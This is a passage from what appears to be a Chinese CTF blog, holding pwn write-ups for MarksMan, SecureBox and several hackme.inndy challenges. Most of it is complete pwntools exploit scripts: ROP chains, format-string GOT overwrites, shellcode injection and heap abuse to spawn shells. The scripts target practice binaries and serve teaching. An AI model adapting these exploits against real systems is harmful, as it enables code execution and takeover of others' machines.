a,s:p.sendlineafter(a,s)def show(name,addr): log.info(name + " --&gt; %s",hex(addr))time = 0while time &lt; 200: ru("levels ~") ru("Math: ") a = int(rc(2)) ru("* ") b = int(rc(2)) ru("+ ") c = int(rc(2)) ru("+ ") d = int(rc(2)) res = a*b+c+d sla("answer:",str(res)) ru('\n') time += 1 log.info("time --&gt; %d",time)sl(0x64*'a' + p64(0x12235612))p.interactive() MarksMan 直接给了libc，而且有一次任意地址写的操作，可以写3个字节；但是程序保护全开 写操作结束后调用dlopen，最后退出 所以我们可以修改_rtld_lock为onegadget 但是这里又有一个问题，onegadget总共3个，前两个栈结构不满足无法使用，而第三个却被作者ban了 这里我选择拆解汇编onegadget = libc_base + one[2] - 5 exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#coding:utf-8from pwn import *import syslocal = 1if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./chall') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') one = [0x45216,0x4526a,0xf02a4,0xf1147]else: p = remote("39.97.210.182","10055") libc = ELF('./libc.so.6') one = [0x4f2c5,0x4f322,0x10a38c]#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202040) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)rc = lambda s:p.recv(s)sl = lambda s:p.sendline(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def show(name,addr): log.info(name + " --&gt; %s",hex(addr))ru("near: ")puts_addr = int(ru('\n').strip('\n'),16)show("puts_addr",puts_addr)debug()libc_base = puts_addr - libc.symbols['puts']malloc_hook = libc_base + libc.symbols['__malloc_hook']system = libc_base + libc.symbols['system']onegadget = libc_base + one[2] - 5show("libc_base",libc_base)show("onegadget",onegadget)# fini = libc_base + 0x7d82a8# fini = libc_base + 0x5deac0# fini = libc_base + 0x7f4f48 #libc2.23fini = libc_base + 0x81df60 #libc2.27show("fini",fini)a = onegadget &amp; 0xffb = (onegadget &amp; 0xff00) &gt;&gt; 8c = (onegadget &amp; 0xff0000) &gt;&gt; 16show('a',a)show('b',b)show('c',c)# pause()# debug(0xd63)sla("shoot!\n",str(fini))sla("biang!\n",chr(a))sla("biang!\n",chr(b))sla("biang!\n",chr(c))p.interactive()# p &amp;_rtld_global._dl_rtld_lock_recursive SecureBox123451.Allocate2.Delete3.Enc4.Show5.Exit 4个功能，且对于写入的数据会去亦或一组随机数，但是这组随机数在allocate的时候就给我们了，所以这里问题不大，show函数可以泄漏出libc，但是也只有泄漏的作用。过了几篇这些功能函数并没有发现其它漏洞的存在。 这里吸取教训，做pwn的时候不能完全依赖IDA反编译出来的伪C代码；赛后经师傅提醒才发现题目的漏洞点： 在Allocate函数中这一句if ( size &gt; 0x100 &amp;&amp; size &lt;= 0xFFF )这是对 堆块大小进行的判断，这样看起来一点问题都没有，我们回到汇编去看 在检测下界的时候用的是[rbp+size]，这没问题，但是在检测上界的时候却用eax，也就是拿32位的寄存器去检测一个64位的值，所以这里就能往上溢出，给一个很大的size，使得malloc返回0，再结合Enc中的Offset of msg就可以做到任意地址写 exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#coding:utf-8from pwn import *import syslocal = 1if len(sys.argv) == 2 and (sys.argv[1] == 'DEBUG' or sys.argv[1] == 'debug'): context.log_level = 'debug'if local: p = process('./chall') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') one = [0x45216,0x4526a,0xf02a4,0xf1147]else: p = remote("")#内存地址随机化def debug(addr=0,PIE=True): if PIE: text_base = int(os.popen("pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'".format(p.pid)).readlines()[1], 16) print "breakpoint_addr --&gt; " + hex(text_base + 0x202060) gdb.attach(p,'b *&#123;&#125;'.format(hex(text_base+addr))) else: gdb.attach(p,"b *&#123;&#125;".format(hex(addr))) sd = lambda s:p.send(s)rc = lambda s:p.recv(s)sl = lambda s:p.sendline(s)ru = lambda s:p.recvuntil(s)sda = lambda a,s:p.sendafter(a,s)sla = lambda a,s:p.sendlineafter(a,s)def info(name,addr): log.info(name + " --&gt; %s",hex(addr))def allocate(size): sla("Exit\n",'1') sla("Size: \n",str(size))def delete(idx): sla("Exit\n",'2') sla("ID: \n",str(idx))def enc(idx,start,l,data): sla("Exit\n",'3') sla("ID: \n",str(idx)) sla("msg: \n",str(start)) sla("msg: \n",str(l)) sla("Msg: \n",data)def show(idx,start,l): sla("Exit\n",'4') sla("ID: \n",str(idx)) sla("msg: \n",str(start)) sla("msg: \n",str(l))# debug(0xef4)allocate(0x101) #0allocate(0x101) #1ru("Key: \n")key1 = []for i in range(0x10): key1.append(int(ru(" ").strip(" "),16))delete(0)allocate(0x101) #0show(0,0,8)ru("Msg: \n")main_arena = u64(rc(6).ljust(8,'\x00')) - 88malloc_hook = main_arena - 0x10libc_base = malloc_hook - libc.symbols['__malloc_hook']free_hook = libc_base + libc.symbols['__free_hook']system = libc_base + libc.symbols['system']onegadget = libc_base + one[0]info("main_arena",main_arena)allocate(0x1000000000fff) #2ru("Key: \n")key2 = []for i in range(0x10): key2.append(int(ru(" ").strip(" "),16))pay = ""s = p64(system)for i in range(8): pay += chr(ord(s[i])^key2[i])# debug(0x1199)enc(2,free_hook,8,pay)pay = ""s = "/bin/sh\x00"for i in range(8): pay += chr(ord(s[i])^key1[i])enc(1,0,8,pay)delete(1)p.interactive()]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[hackme.inndy之pwn]]></title>
    <url>%2F2020%2F06%2F21%2Fhackme.inndy%E4%B9%8Bpwn%2F</url>
    <content type="text"><![CDATA[catflagnc 连接直接get shell homeosrk数组下标溢出，绕过canary保护直接修改ret地址为后门函数call_me_mabe 这里可以算出arr[14]为ret位置 exp: 1234567891011121314151617from pwn import *# p = process('./homework')p = remote('hackme.inndy.tw',7701)call_me = 0x80485FBprint str(call_me)pause()p.recvuntil('What\'s your name? ')p.sendline('n0va')p.recvuntil('4 &gt; dump all numbers\n')p.recvuntil(' &gt; ')p.sendline('1')p.recvuntil('Index to edit: ')p.sendline('14')p.recvuntil('How many? ')p.sendline(str(call_me))p.sendline('0')p.interactive() ROP栈溢出，而且是gets的栈溢出，溢出空间无限，可以随便写，这道题有很多种写法，这里选择system call execve的系统调用号为0xb,eax,放着系统调用号，ebx,ecx,edx分别放着execve的三个参数，先找一波gadget 123450x0806c943 : int 0x800x080b8016 : pop eax ; ret0x080481c9 : pop ebx ; ret0x080de769 : pop ecx ; ret0x0806ecda : pop edx ; ret 于是就可以构造ROP链进入系统 调用了 exp: 123456789101112131415161718192021222324252627#-*-coding:utf-8-*-from pwn import *p = process('./rop')p = remote("hackme.inndy.tw","7704")elf = ELF('./rop')bss_addr = elf.bss()pop_in_ecx = 0x0804b5bapop_eax = 0x080b8016pop_ebx = 0x080481c9pop_ecx = 0x080de769pop_edx = 0x0806ecdaint_0x80 = 0x0806c943payload = 16*'a'payload += p32(pop_ecx) + p32(bss_addr)#分两次将'/bin/sh'写入bss段payload += p32(pop_in_ecx) + '/bin'payload += p32(pop_ecx) + p32(bss_addr+4)payload += p32(pop_in_ecx) + '/sh\x00'payload += p32(pop_eax) + p32(0xb)#bss_addr放着'/bin/sh'做为execve的第一个参数payload += p32(pop_ebx) + p32(bss_addr)payload += p32(pop_ecx) + p32(0)payload += p32(pop_edx) + p32(0)payload += p32(int_0x80)p.sendline(payload)p.interactive() ROP2syscall()是系统调用函数，第一个参数是系统调用号，后面的函数分别为调用函数的参数，查表可知4为write函数的系统调用号，3为read函数的系统调用号，所以 123syscall(4, 1, v4, 42); == write(1,v4,42)syscall(3, 0, &amp;v1, 1024); == read(0,&amp;v1,1024)return syscall(4, 1, &amp;v1, 1024); == return write(1,&amp;v1,1024) read 这里就存在一个很明显的栈溢出了，我们可以控制程序回到syscall的位置，只要将他的4个参数分别设为(b,&#39;/bin/sh&#39;,0,0)就行了 exp: 1234567891011121314151617181920#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'# p = process('./rop2')p = remote("hackme.inndy.tw","7703")elf = ELF('./rop2')bss_addr = elf.bss()syscall = 0x8048320overflow = 0x8048454#先调用read往bss段写入'/bin/sh'payload = 16*'a'payload += p32(syscall) + p32(overflow)payload += p32(3) + p32(0) + p32(bss_addr) + p32(8)p.sendline(payload)p.send('/bin/sh\x00')#调用execve函数get shellpayload = 16*'a'payload += p32(syscall) + p32(0) + p32(0xb) + p32(bss_addr) + p32(0) + p32(0)p.sendline(payload)p.interactive() toooomuch可以看到有一个gets，而且还有一个print_flag函数直接打印flag，溢出跳转就完事了 exp: 123456789from pwn import *# context.log_level = 'debug'# p = process('./toooomuch')p = remote("hackme.inndy.tw","7702")print_flag = 0x804863Bpayload = 28*'a'payload += p32(print_flag)p.sendline(payload)p.interactive() toooomuch-2程序 跟toooomuch一模一样，但是这次要求get shell ，那就不能直接跳到print_flag函数上去了 因为什么保护都没开，所以可以直接ret2shellcode，思路是这样的，先跳到gets函数往bss段写入shellcode，再跳到bss执行shellcode exp: 123456789101112131415from pwn import *context.log_level = 'debug'# p = process('./toooomuch-2')p = remote("hackme.inndy.tw","7702")elf = ELF('./toooomuch-2')bss_addr = elf.bss()gets_addr = elf.plt['gets']shellcode = asm(shellcraft.sh())payload = 28*'a'#----------(覆盖返回地址) ---（gets的返回地址）--（gets的参数）payload += p32(gets_addr) + p32(bss_addr) + p32(bss_addr)p.recvuntil('Give me your passcode: ')p.sendline(payload)p.sendline(shellcode)p.interactive() echo这是一道格式化字符串，直接修改printf_got为system_plt的值就行了，都是已知值，手动修改（当然也可以用工具 : fmtstr_payload(7,{printf_got:system_plt})） exp: 123456789101112131415161718192021222324252627#-*-coding:utf-8-*-# 偏移为7from pwn import *# p = process('./echo')p = remote("hackme.inndy.tw","7711")elf = ELF('./echo')printf_got = elf.got['printf']system_plt = elf.plt['system']print "printf_got--&gt;" + hex(printf_got)print "system_plt--&gt;" + hex(system_plt) #0x8048400pause()payload = p32(printf_got) + p32(printf_got+1) + p32(printf_got+2) + p32(printf_got+3)'''\x00\x84\x04\x08'''payload += '%240c' + '%7$hhn' #0x100-16payload += '%132c' + '%8$hhn' #0x184-0x100payload += '%128c' + '%9$hhn' #0x204-0x184payload += '%4c' + '%10$hhn' #0x208-0x204print payloadpause()p.sendline(payload)p.sendline('/bin/sh\x00')p.interactive() echo264位的格式化字符串漏洞，漏点跟echo一样，不过有一些坑需要注意一下 首先是保护开启了PIE，位置无关的可执行程序，即可执行程序的代码指令集可以被加载到任意位置，进程通过相对地址获取指令操作和数据，如果不是位置无关的可执行程序，则该可执行程序的代码指令集必须放到特定的位置才可以运行进程。但是低两位字节是固定的，所以可以通过这个泄露出程序的基地址。 64位程序函数地址存在&#39;\x00&#39;截断，所以要将函数地址放在最后（不能用fmtstr_payload这个工具，它只适用于32位） printf处下断查看栈可以看到main+74和libc_start_main+340这两个可以泄漏的地址，偏移分别为41和43，因为开启了PIE，而且后三位不变，所以可以泄漏出程序基地址就是0x555555554a03-0xa03，之后对一切地址的操作都加上这个基地址就是正确的地址了，以及libc_start_main的真实地址0x7ffff7a2d830-240就可以算出偏移，从而得到其它函数的真空地址，比如system，不过这道题我用的是one_gadget一把梭 得到了真实地址和偏移就可以进行写入操作了，修改exit_got表为one_gadget_addr exp: 1234567891011121314151617181920212223242526272829303132333435363738#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'p = remote("hackme.inndy.tw","7712")# p = process('./echo2')elf = ELF('./echo2')libc = ELF("./libc-2.23.so.x86_64") #hackme网站下载# libc = elf.libc #本地libc#泄漏 main 地址 p.sendline('%41$p')elf_base = int(p.recv(),16)-0xa03print "elf_base--&gt;" + hex(elf_base)#泄漏 libc_start_main 地址 p.sendline('%43$p')libc_start_main = int(p.recv(),16)-240libc_base = libc_start_main - libc.symbols['__libc_start_main']print "libc_start_main--&gt;" + hex(libc_start_main)# one_gadget = 0xf02a4 + libc_base #本地one_gadgetone_gadget = 0xf0897+libc_base #远程one_gadgetprint "one_gadget--&gt;" + hex(one_gadget)exit_got = elf.got['exit'] + elf_baseprint "exit_got--&gt;" + hex(exit_got)hex_one_gadget = hex(one_gadget)payload1 = 4*'a'+'%'+str(int(hex_one_gadget[-4:],16)-4)+'c%8$hn'+p64(exit_got)# payload1 = '%'+str(int(hex_one_gadget[-4:],16))+'c%10$hn'+p64(exit_got)payload2 = 4*'a'+'%'+str(int(hex_one_gadget[-8:-4],16)-4)+'c%8$hn'+p64(exit_got+2)payload3 = 4*'a'+'%'+str(int(hex_one_gadget[-12:-8],16)-4)+'c%8$hn'+p64(exit_got+4)#下断# point = 0x984+elf_base# point = str(hex(point))# gdb.attach(p,"b *"+point)p.sendline(payload1)sleep(1)p.sendline(payload2)sleep(1)p.sendline(payload3)sleep(1)p.interactive() 这里解释一下4*’a&#39;：是为了最后的p64(exit_got)对齐，gdb下断看一个栈的分布就清楚了 ehco3还是格式化字符串，不过我们的输入不再是在栈中了，是保存在bss段，这就不好操作了，我们需要在栈中找到指向栈的指针来进行操作向栈写入内容（建议先做一下jarvis OJ的lab 9然后再回头来看这题，因为题型差不多，但是lab 9没有下面的蛇皮操作） 不过这题最坑的还是在hardfmt函数前的这个玩意v3 = alloca(16 * (((buf &amp; 0x3039u) + 30) / 0x10));看了大佬的 writeup 这是一个抬栈操作，我们回到汇编去可以看到，在最后esp会减去eax使得整个栈帧往栈顶移了eax，而且eax是个随机数，好在还是有范围的。 测试一下我们可以发现大概的范围： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import randomfor x in xrange(1,50): buf= random.randint(0,0xffffffff) a=16 * (((buf &amp; 0x3039) + 30) / 0x10) print hex(a)----------------------------------------------------------------------------------------------0x400x100x10300x200x30200x300x30300x30100x30200x10100x10100x20200x20200x200x30200x300x300x20400x30500x30500x20300x400x30300x30300x400x20200x30400x10300x30500x10400x400x30300x20300x200x30200x10400x30100x30300x400x20500x500x10200x30200x30300x400x30200x30400x30400x3020 可能的数值有0x10,0x20,0x30,0x40,0x1030,........等等等等，也就是说一个值对应一个栈帧，所以我们只需要确定eax的值就可以确定栈的分布了，在.text:08048774 sub esp, eax下断gdb调试一下： 这一次eax 的值 为0x2050,我把它设为0x20，进去，在printf 下个断点，c一下，就可以看到正确的栈帧了 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152Breakpoint *0x08048646pwndbg&gt; stack 5000:0000│ esp 0xffffcd00 —▸ 0x804a080 (buff) ◂— &apos;AAAAAAAA\n&apos;... ↓02:0008│ 0xffffcd08 ◂— 0x100003:000c│ 0xffffcd0c ◂— 0x104:0010│ 0xffffcd10 ◂— 0xbd5d204605:0014│ 0xffffcd14 —▸ 0x804829c ◂— add byte ptr [ecx + ebp*2 + 0x62], ch06:0018│ 0xffffcd18 —▸ 0xf7ffd918 ◂— 0x007:001c│ 0xffffcd1c ◂— 0x008:0020│ 0xffffcd20 —▸ 0xffffcd5e ◂— 0x3080409:0024│ 0xffffcd24 —▸ 0xf7e0b018 ◂— stosd dword ptr es:[edi], eax0a:0028│ 0xffffcd28 —▸ 0xf7e6021b (setbuffer+11) ◂— add ebx, 0x151de50b:002c│ 0xffffcd2c —▸ 0x80485d2 (hardfmt+12) ◂— add ebx, 0x1a2e0c:0030│ 0xffffcd30 —▸ 0xf7fe77eb (_dl_fixup+11) ◂— add esi, 0x158150d:0034│ 0xffffcd34 ◂— 0x00e:0038│ 0xffffcd38 —▸ 0xffffcd10 ◂— 0xbd5d20460f:003c│ 0xffffcd3c ◂— 0xc7e69f0010:0040│ 0xffffcd40 —▸ 0xffffcda8 ◂— 0x011:0044│ 0xffffcd44 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x112:0048│ ebp 0xffffcd48 —▸ 0xffffcda8 ◂— 0x013:004c│ 0xffffcd4c —▸ 0x804877b (main+236) ◂— mov eax, 014:0050│ 0xffffcd50 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x115:0054│ 0xffffcd54 —▸ 0x804a060 (magic) ◂— 0xbd5d204616:0058│ 0xffffcd58 —▸ 0xf7ed62ac (__close_nocancel+18) ◂— mov ebx, edx17:005c│ 0xffffcd5c —▸ 0x804874a (main+187) ◂— add esp, 0x1018:0060│ 0xffffcd60 ◂— 0x319:0064│ 0xffffcd64 —▸ 0x804a060 (magic) ◂— 0xbd5d20461a:0068│ 0xffffcd68 ◂— 0x41b:006c│ 0xffffcd6c —▸ 0x80486a6 (main+23) ◂— add ebx, 0x195a1c:0070│ 0xffffcd70 ◂— 0x80001d:0074│ 0xffffcd74 —▸ 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db01e:0078│ 0xffffcd78 —▸ 0xffffce5c —▸ 0xffffd094 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;1f:007c│ 0xffffcd7c —▸ 0xffffce54 —▸ 0xffffd05e ◂— 0x6d6f682f (&apos;/hom&apos;)20:0080│ 0xffffcd80 ◂— 0x1... ↓22:0088│ 0xffffcd88 —▸ 0xffffce5c —▸ 0xffffd094 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;23:008c│ 0xffffcd8c ◂— 0x324:0090│ 0xffffcd90 ◂— 0x25d832425:0094│ 0xffffcd94 ◂— 0xdddfa71b26:0098│ 0xffffcd98 —▸ 0xffffce5c —▸ 0xffffd094 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;27:009c│ 0xffffcd9c ◂— 0xc7e69f0028:00a0│ 0xffffcda0 —▸ 0xffffcdc0 ◂— 0x129:00a4│ 0xffffcda4 ◂— 0x0... ↓2b:00ac│ 0xffffcdac —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x102c:00b0│ 0xffffcdb0 —▸ 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0... ↓2e:00b8│ 0xffffcdb8 ◂— 0x02f:00bc│ 0xffffcdbc —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x1030:00c0│ 0xffffcdc0 ◂— 0x131:00c4│ 0xffffcdc4 —▸ 0xffffce54 —▸ 0xffffd05e ◂— 0x6d6f682f (&apos;/hom&apos;) 这里就以0x20的栈帧进行分析了，可以发现几个有用的地址 123456714:0050│ 0xffffcd50 —▸ 0x804a000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x8049f10 (_DYNAMIC) ◂— 0x115:0054│ 0xffffcd54 —▸ 0x804a060 (magic) ◂— 0xbd5d2046...1e:0078│ 0xffffcd78 —▸ 0xffffce5c —▸ 0xffffd094 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;1f:007c│ 0xffffcd7c —▸ 0xffffce54 —▸ 0xffffd05e ◂— 0x6d6f682f (&apos;/hom&apos;)...2b:00ac│ 0xffffcdac —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x10 偏移分别 为20,21,30,31,43，(这里规定它们分别为fmt20,fmt21,ebp1,ebp2) 而且偏移43处放着的是libc_start_main+247的地址，它的偏移是不变的，所以就可以用来做爆破的标志，来找到我们要的栈帧（exa = 0x20的栈帧） 123456789while True: # p = process('./echo3') p = remote("hackme.inndy.tw","7720") payload = '%43$p#%30$p' p.sendline(payload) data = p.recvuntil('#') if data[-4:-1] == '637': break p.close() 爆破完成之后就可以进行正常的操作了思路如下 ： 通过libc_start_main算出偏移，进而得到system的真实地址 %n操作 30，10偏移处使ebp1指向fmt20，ebp2指向fmt21 %n操作 ebp1使fmt20的内容修改为exit_got 操作 ebp2 使fmt21的内容修改为exit_got+2 %n操作 fmt20 修改exit_got 为system低4位，操作 fmt21 修改exit_got+2为system高4位 发送&#39;/bin/sh&#39;作为system函数的参数 完整exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'elf = ELF('./echo3')# libc = elf.libclibc = ELF('./libc-2.23.so.i386')while True: # p = process('./echo3') p = remote("hackme.inndy.tw","7720") payload = '%43$p#%30$p' p.sendline(payload) data = p.recvuntil('#') if data[-4:-1] == '637': break p.close()libc_start_main = int(data[:-1],16)-247ebp1 = int(p.recv()[:-1],16) #在偏移为 31 (ebp1的偏移为87)print 'libc_start_main--&gt;' + hex(libc_start_main)print 'ebp1--&gt;' + hex(ebp1)fmt20 = ebp1-0x10cfmt21 = ebp1-0x108offset = libc_start_main - libc.symbols['__libc_start_main']system_addr = offset + libc.symbols['system']print 'system_addr--&gt;' + hex(system_addr)print 'libc_system--&gt;' + hex(libc.symbols['system'])pause()# exit_got = elf.got['exit']# print 'exit_got--&gt;' + hex(exit_got)printf_got = elf.got['printf']print 'printf_got--&gt;' + hex(printf_got)#%n操作 30,31偏移处使ebp1指向 fmt20 ebp2指向 fmt21payload_1 = '%'+str(fmt20&amp;0xffff)+'c%30$hn'payload_1 += '%4c%31$hn'payload_1 += '1111'# gdb.attach(p,"b *0x08048646")# pause()p.sendline(payload_1)#%n操作 ebp1使fmt20内容修改为exit_got,操作 ebp2使fmt21内容修改为exit_got+2payload_2 = '%'+str(printf_got&amp;0xffff)+'c%85$hn'payload_2 += '%2c%87$hn'payload_2 += '2222'# gdb.attach(p,"b *0x08048646")# pause()p.recvuntil('1111\n')p.sendline(payload_2)#%n操作 fmt20修改exit_got为system低4位 fmt21修改为exit_got+2为system高4位payload_3 = '%'+str((system_addr&gt;&gt;16)&amp;0xff)+'c%20$hhn'payload_3 += '%'+str((system_addr&amp;0xffff)-((system_addr&gt;&gt;16)&amp;0xff))+'c%21$hn' payload_3 += '3333'# gdb.attach(p,"b *0x08048646")# pause()p.recvuntil('2222\n')p.sendline(payload_3)p.recv()p.recvuntil('3333\n')p.send('/bin/sh\x00')p.interactive() smash-the-stack这题是利用ssp报错的方法泄漏出flag，在ctf-wiki中有介绍：Stack smash 只要将argv[0]覆盖为存放flag的地址即可，在write处下断查看argvp[0]的偏移 1234567891011121314151617181920212223pwndbg&gt; stack 2000:0000│ esp 0xffffcd70 ◂— 0x101:0004│ 0xffffcd74 —▸ 0xffffcd88 ◂— 0x31313131 (&apos;1111&apos;)02:0008│ 0xffffcd78 ◂— &apos;1111&apos;03:000c│ 0xffffcd7c ◂— 0x004:0010│ 0xffffcd80 ◂— 0x105:0014│ 0xffffcd84 —▸ 0xffffce44 —▸ 0xffffd046 ◂— 0x6d6f682f (&apos;/hom&apos;)06:0018│ ebx ecx 0xffffcd88 ◂— 0x31313131 (&apos;1111&apos;)07:001c│ 0xffffcd8c ◂— 0xc7f80a3208:0020│ 0xffffcd90 —▸ 0xffffcdb0 ◂— 0x109:0024│ 0xffffcd94 ◂— 0x0... ↓0b:002c│ 0xffffcd9c —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x100c:0030│ 0xffffcda0 —▸ 0xf7fb2000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1b1db0... ↓0e:0038│ 0xffffcda8 ◂— 0x00f:003c│ 0xffffcdac —▸ 0xf7e18637 (__libc_start_main+247) ◂— add esp, 0x1010:0040│ 0xffffcdb0 ◂— 0x111:0044│ 0xffffcdb4 —▸ 0xffffce44 —▸ 0xffffd046 ◂— 0x6d6f682f (&apos;/hom&apos;)12:0048│ 0xffffcdb8 —▸ 0xffffce4c —▸ 0xffffd084 ◂— &apos;LC_PAPER=zh_CN.UTF-8&apos;13:004c│ 0xffffcdbc ◂— 0x0pwndbg&gt; distance 0xffffce44 0xffffcd880xffffce44-&gt;0xffffcd88 is -0xbc bytes (-0x2f words) exp: 123456789from pwn import *context.log_level = 'debug'# p = process('./smash')p = remote('hackme.inndy.tw',7717)flag_addr = 0x804A060p.recvuntil('the flag')p.sendline(47*'a'+p32(flag_addr))# p.sendline(48*p32(flag_addr))p.interactive() 还有另一种做法就是不用算偏移，直接塞一大把p32(flag_addr)进去，因为只要覆盖到argv[0]的位置就可以了，但是实践表明，如果这个数差偏移太多的话，也是不太行的。（比如上面的塞100个在本地还是可以的，但是远程的话63个以上就已经不正常了，我猜是覆盖到了___stack_chk_fail函数部分导致函数无法正常执行，也就不存在通过___stack_chk_fail函数打印出flag了） onepunch这道题还是挺有趣的，起初看反编译代码不是很理解 v6 跟v4的关系，但是在汇编中就很直观了，v6是地址，v4是写入的内容，也就是任意地址写 还有就是这个程序的text段居然是可写的，结合上面的任意地址写就意味着我们可以修改程序的逻辑实现各种操作，相当于打patch 再看一下main函数：这里对输入的v4进行判断，如果不等于255就跳到400773处，所以我们只需要在这里打patch使其跳到main函数就可以实现无限输入。 1234567.text:0000000000400756 mov rax, [rbp+v6].text:000000000040075A mov edx, [rbp+v4].text:000000000040075D mov [rax], dl.text:000000000040075F ; 14: if ( v4 == 255 ).text:000000000040075F mov eax, [rbp+v4].text:0000000000400762 cmp eax, 0FFh.text:0000000000400767 jnz short loc_400773 这里就需要修改16进制了，IDA-&gt;options 将Number of opcode bytes(non-graph)的值设为16就可以看到汇编对应的16进制数。接下来算偏移，要从0x400769跳跟0x4006f1偏移应该为0x88 = 136，所以第一步就是将0x400768处的0xA修改为0x88 123456p.recvuntil('Where What?')# gdb.attach(p,"b *0x400741")# pause()p.sendline('0x400768')# sleep(0.1)p.sendline('138') 接下来往text段写入shellcode，写完后再修改0x400768处为shellcode地址即可 完整exp: 123456789101112131415161718192021222324252627#-*-coding:utf-8-*-from pwn import *# p = process('./onepunch')p = remote("hackme.inndy.tw","7718")context.log_level = 'debug'p.recvuntil('Where What?')# gdb.attach(p,"b *0x400741")# pause()p.sendline('0x400768')# sleep(0.1)p.sendline('138')shell_addr = 0x400790# shellcode = asm(shellcraft.sh())shellcode = "\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05" shell_len = len(shellcode)i = 0while i&lt;shell_len: p.recvuntil('Where What?') p.sendline(str(hex(shell_addr+i))) # sleep(0.1) p.sendline(str(ord(shellcode[i]))) i += 1p.recvuntil('Where What?')p.sendline('0x400768')# sleep(0.1)p.sendline('39')p.interactive() tictactoe-1 每次可以写入一个字节，所以就很容易可以想到，把puts的got表修改成0x08048C46(cat flag的位置)，就可以拿到flag_simple了 exp: 123456789101112131415161718192021222324252627282930313233#-*-coding:utf-8-*-from pwn import *context.log_level = 'debug'# p = process('./tictactoe')p = remote("hackme.inndy.tw","7714")puts_got = 0x804B024# -50distance_addr = 0x8048C46p.recvuntil('Play (1)st or (2)nd? ')p.sendline('1')p.recvuntil('Input move (9 to change flavor): ')p.sendline('9')sleep(0.1)p.sendline('\x46')p.recvuntil('Input move (9 to change flavor): ')p.sendline('-50')p.recvuntil('Input move (9 to change flavor): ')p.sendline('9')sleep(0.1)p.sendline('\x8c')p.recvuntil('Input move (9 to change flavor): ')# gdb.attach(p,"b *0x08048A71")# pause()p.sendline('-49')p.recvuntil('Input move (9 to change flavor): ')p.sendline('9')sleep(0.1)p.sendline('\x04')p.recvuntil('Input move (9 to change flavor): ')p.sendline('-48')p.interactive() rsbo-2 栈溢出漏洞，程序中又有write函数，所以其实很清晰了，利用write函数泄漏出read的真实地址进而得到system的真实地址再跳转到去就可以get shell 了，但是这里有一个坑需要说一下，就是垃圾字符要用\x00去填充而不是用’a’啊啥的这些 因为len(buf)在栈中的位置跟buf的重叠的，所以当我们有字母去填充时，会导致 v8的值出错，这样程序就会崩溃退出 用\x00填的时候才会正常，接下来的操作不用多说了 exp: 12345678910111213141516171819202122232425262728293031323334353637#-*-coding:utf-8-*-# get shell 脚本from pwn import *# p = process('./rsbo')p = remote("hackme.inndy.tw","7706")elf = ELF('./rsbo')# libc = elf.libclibc = ELF('./libc-2.23.so.i386')context.log_level = 'debug'main = 0x804867Fread_plt = elf.plt['read']read_got = elf.got['read']open_plt = elf.plt['open']write_plt = elf.plt['write']bss = elf.bss()# write(1,read_got,4)payload_2 = p32(0)*27 + p32(write_plt) + p32(main) + p32(1) + p32(read_got) + p32(4)print hex(len(payload_2))# gdb.attach(p,"b *0x0804867d")# pause()p.send(payload_2)read_addr = u32(p.recv(4))print "read_addr --&gt; " + hex(read_addr)offset = read_addr - libc.symbols['read']system_addr = offset + libc.symbols['system']bin_libc = libc.search("/bin/sh").next()bin_addr = bin_libc + offsetprint "system_addr --&gt; " + hex(system_addr)print "bin_addr --&gt; " + hex(bin_addr)# pause()# 回到 mainpayload_3 = p32(0)*25 + p32(system_addr) + p32(0) + p32(bin_addr)# gdb.attach(p,"b *0x0804867d")# pause()p.send(payload_3)p.interactive() rsbo1其实我是用的rsbo2的脚本直接拿到两题的flag再回过头来用open的方法做rsbo1，因为我一直在纳闷open返回的指针怎么获取给read用，但是后来问了师兄才知道了read的第一个参数的妙处： 关于read的第一个参数read(fd,buf,size) 为0时表示标准输入流（键盘)，为1时表示标准输出流（屏幕）(1一般是用在write吧)，为2时表示错误信息输出，为3之后表示文件流依次表示第一个open的文件第二个，第三个…….（如果同时打开多个文件的话） 所以open(“/home/ctf/flag”)后可以直接调用read(3,bss,0x60)再write就可以把flag打印出来的 